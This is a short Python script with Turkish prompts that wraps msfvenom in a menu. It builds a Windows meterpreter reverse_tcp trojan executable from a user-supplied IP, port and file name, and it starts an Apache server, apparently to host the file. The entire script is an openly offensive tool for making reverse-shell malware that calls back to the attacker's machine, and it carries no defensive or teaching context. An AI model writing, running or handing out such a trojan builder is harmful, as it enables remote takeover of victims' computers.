import os
import time

os.system("clear")


print("""
 _      ____  _____ _     _____ _      ____  _            ____  ____  ____  _____
/ \__/|/ ___\/    // \ |\/  __// \  /|/  _ \/ \__/|      /   _\/  _ \/  _ \/  __/
| |\/|||    \|  __\| | //|  \  | |\ ||| / \|| |\/||_____ |  /  | / \|| | \||  \  
| |  ||\___ || |   | \// |  /_ | | \||| \_/|| |  ||\____\|  \__| \_/|| |_/||  /_ 
\_/  \|\____/\_/   \__/  \____\\_/  \|\____/\_/  \|      \____/\____/\____/\____\
                                                                                 
                                                                                 
1 - Trojan oluştur

2 - APACHE server başlat

""")




işlem = input("Hedef işlem numaranız  : ")


if (işlem == "1"):
	ip = input("Local IP adresinizi giriniz  : ")
	port = input("Local Port adresini belileyin  : ")
	out = input("trojana isim ver : ")
	os.system("clear && msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f exe -o "+out)
	
if (işlem == "2"):
	os.system("clear && service apache2 start")
